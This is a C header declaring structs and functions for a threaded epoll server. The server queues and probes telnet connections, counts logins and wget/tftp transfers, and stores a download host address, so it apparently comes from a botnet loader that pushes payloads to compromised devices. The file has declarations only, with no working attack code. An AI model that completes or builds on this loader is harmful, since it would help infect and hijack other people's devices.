#pragma once

#include <sys/epoll.h>
#include "includes.h"
#include "telnet_info.h"
#include "connection.h"

struct server {
    uint32_t max_open;
    volatile uint32_t curr_open;
    volatile uint32_t total_input, total_logins, total_echoes, total_wgets, total_tftps, total_successes, total_failures;
    char *wget_host_ip, *tftp_host_ip;
    struct server_worker *workers;
    struct connection **estab_conns;
    ipv4_t *bind_addrs;
    pthread_t to_thrd;
    port_t wget_host_port;
    uint8_t workers_len, bind_addrs_len;
    int curr_worker_child;
};

struct server_worker {
    struct server *srv;
    int efd; // We create a separate epoll context per thread so thread safety isn't our problem
    pthread_t thread;
    uint8_t thread_id;
};

struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip);
void server_destroy(struct server *srv);
void server_queue_telnet(struct server *srv, struct telnet_info *info);
void server_telnet_probe(struct server *srv, struct telnet_info *info);
 
static void bind_core(int core);
static void *worker(void *arg);
static void handle_output_buffers(struct server_worker *);
static void handle_event(struct server_worker *wrker, struct epoll_event *ev);
static void *timeout_thread(void *);
